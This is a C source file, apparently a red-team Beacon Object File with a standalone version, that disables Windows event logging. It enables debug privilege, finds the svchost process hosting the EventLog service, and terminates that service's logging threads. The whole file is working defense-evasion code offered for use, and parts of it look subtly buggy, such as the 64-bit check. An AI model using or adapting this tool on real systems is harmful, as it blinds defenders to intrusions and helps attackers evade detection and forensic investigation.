/*

 Credits: 
 - reenz0h (twitter: @SEKTOR7net) - Red Team Operator course code template Blinding Eventlog
 - Alex Ionescu, NSA, Wen Jia Liu, Halil Dalabasmaz
*/

/**
 * Load custom header files.
 */

#include "eva-blindingeventlog-bof-structs.h"
#include "eva-blindingeventlog-bof-imports.h"

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		PRINT("[*] OpenProcessToken() failed!\n");
		return FALSE;
	}

    if (!LookupPrivilegeValueA( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        PRINT("[*] LookupPrivilegeValue error: %u\n", GetLastError()); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if ( !AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { 
          PRINT("[*] AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE;
    } 

    if ( GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          PRINT("[*] The token does not have the specified privilege.\n");
          return FALSE;
    }
    return TRUE;
}

#ifdef BOF

// Usage: eva-blindingeventlog (no args)
void go(char *args, int alen) {
	SERVICE_STATUS_PROCESS svcStatus = {0};
	DWORD bytesNeeded = 0;
	HANDLE hSvcProc = NULL;
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;
	PVOID subProcessTag = NULL;
	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;
	
	
	// get function pointers
	NtQueryInformationThread_t pNtQueryInformationThread = (NtQueryInformationThread_t) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
	I_QueryTagInformation_t pI_QueryTagInformation = (I_QueryTagInformation_t) GetProcAddress(GetModuleHandleA("advapi32.dll"), "I_QueryTagInformation");
	
	
	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
		PRINT("Boooo! No powers, we die!\n");
		return;
	}
	
	// talk to Service Manager to find Eventlog process
	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE svc = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);
	
	//Get PID of svchost.exe that hosts EventLog service
	QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE) &svcStatus, sizeof(svcStatus), &bytesNeeded);
	DWORD svcPID = svcStatus.dwProcessId;
	
	PRINT("[+] Target -> Svchost with eventlog - PID: %d\n", svcPID);

	// open svchost.exe containing Eventlog
	hSvcProc = OpenProcess(PROCESS_VM_READ, FALSE, svcPID);
	if (hSvcProc == NULL) {
		PRINT("[*] Unable to open the target process...\n");
		return;
	}

	// get snapshot of all threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE){
		PRINT("[*] Unable to create processes snapshot...\n");
		return;
	}
	te32.dwSize = sizeof(THREADENTRY32);
	
	// parse the snapshot and search for threads belonging to eventlog
	if (!Thread32First(hThreadSnap, &te32)) {
		PRINT("[*] Thread32First() and we died\n");
		CloseHandle(hThreadSnap);
		return;
	}
	
	do {
		// found the one from svchost.exe containing Eventlog
		if (te32.th32OwnerProcessID == svcPID) {
			// now searching for subProcessTag assigned to Eventlog
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			
			if (hThread == NULL) {
				PRINT("OpenThread : %u Error! ErrorCode:%u\n", te32.th32ThreadID,  GetLastError());
				return;
			}
			NTSTATUS status = pNtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS) 0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
			
			// check if svchost.exe is 32- or 64-bit, offset in TEB is different for each arch
			bIsWoW64 =  IsWow64Process(hSvcProc, &bIsWoW64);
			if (!bIsWoW64)
				dwOffset = 0x1720;
			else
				dwOffset = 0xf60;
			
			// read subProcessTag value from TEB of svchost.exe
			ReadProcessMemory(hSvcProc, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);

			if (!subProcessTag) {
				CloseHandle(hThread);
				continue;
			}

			SC_SERVICE_TAG_QUERY query = { 0 };
			
			// Check the tag information of the thread, if its 'query.pBuffer' is called "eventlog" then that is one of the threads used to capture the events to be displayed.
			if (pI_QueryTagInformation)	{
				query.processId = (ULONG) svcPID;
				query.serviceTag = (ULONG) subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;
				
				pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);
				
				if (_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0) {
					PRINT("[!] Eventlog thread FOUND: %d. Suspending...", te32.th32ThreadID);
					if ( SuspendThread(hThread) != -1)
						PRINT("[!] Eventlog thread FOUND: %d. Killing...", te32.th32ThreadID);
					
					if ( TerminateThread(hThread, NULL)) {
						PRINT("[+] Done!\n");
					} else {
						PRINT("[-] Failed!\n");
					}
				}
			}
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	CloseHandle(hSvcProc);
    return;
}


#else

int main() {
	SERVICE_STATUS_PROCESS svcStatus = {0};
	DWORD bytesNeeded = 0;
	HANDLE hSvcProc = NULL;
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;
	PVOID subProcessTag = NULL;
	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;
	
	
	// get function pointers
	NtQueryInformationThread_t pNtQueryInformationThread = (NtQueryInformationThread_t) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
	I_QueryTagInformation_t pI_QueryTagInformation = (I_QueryTagInformation_t) GetProcAddress(GetModuleHandleA("advapi32.dll"), "I_QueryTagInformation");
	
	
	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
		PRINT("Boooo! No powers, we die!\n");
		return;
	}
	
	// talk to Service Manager to find Eventlog process
	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE svc = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);
	
	//Get PID of svchost.exe that hosts EventLog service
	QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE) &svcStatus, sizeof(svcStatus), &bytesNeeded);
	DWORD svcPID = svcStatus.dwProcessId;
	
	PRINT("[+] Target -> Svchost with eventlog - PID: %d\n", svcPID);

	// open svchost.exe containing Eventlog
	hSvcProc = OpenProcess(PROCESS_VM_READ, FALSE, svcPID);
	if (hSvcProc == NULL) {
		PRINT("[*] Unable to open the target process...\n");
		return;
	}

	// get snapshot of all threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE){
		PRINT("[*] Unable to create processes snapshot...\n");
		return;
	}
	te32.dwSize = sizeof(THREADENTRY32);
	
	// parse the snapshot and search for threads belonging to eventlog
	if (!Thread32First(hThreadSnap, &te32)) {
		PRINT("[*] Thread32First() and we died\n");
		CloseHandle(hThreadSnap);
		return;
	}
	
	do {
		// found the one from svchost.exe containing Eventlog
		if (te32.th32OwnerProcessID == svcPID) {
			// now searching for subProcessTag assigned to Eventlog
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			
			if (hThread == NULL) {
				PRINT("OpenThread : %u Error! ErrorCode:%u\n", te32.th32ThreadID,  GetLastError());
				return;
			}
			NTSTATUS status = pNtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS) 0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
			
			// check if svchost.exe is 32- or 64-bit, offset in TEB is different for each arch
			bIsWoW64 =  IsWow64Process(hSvcProc, &bIsWoW64);
			if (!bIsWoW64)
				dwOffset = 0x1720;
			else
				dwOffset = 0xf60;
			
			// read subProcessTag value from TEB of svchost.exe
			ReadProcessMemory(hSvcProc, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);

			if (!subProcessTag) {
				CloseHandle(hThread);
				continue;
			}

			SC_SERVICE_TAG_QUERY query = { 0 };
			
			// Check the tag information of the thread, if its 'query.pBuffer' is called "eventlog" then that is one of the threads used to capture the events to be displayed.
			if (pI_QueryTagInformation)	{
				query.processId = (ULONG) svcPID;
				query.serviceTag = (ULONG) subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;
				
				pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);
				
				if (_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0) {
					PRINT("[!] Eventlog thread FOUND: %d. Suspending...", te32.th32ThreadID);
					if ( SuspendThread(hThread) != -1)
						PRINT("[!] Eventlog thread FOUND: %d. Killing...", te32.th32ThreadID);
					
					if ( TerminateThread(hThread, NULL)) {
						PRINT("[+] Done!\n");
					} else {
						PRINT("[-] Failed!\n");
					}
				}
			}
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	CloseHandle(hSvcProc);
    return 0;
}

#endif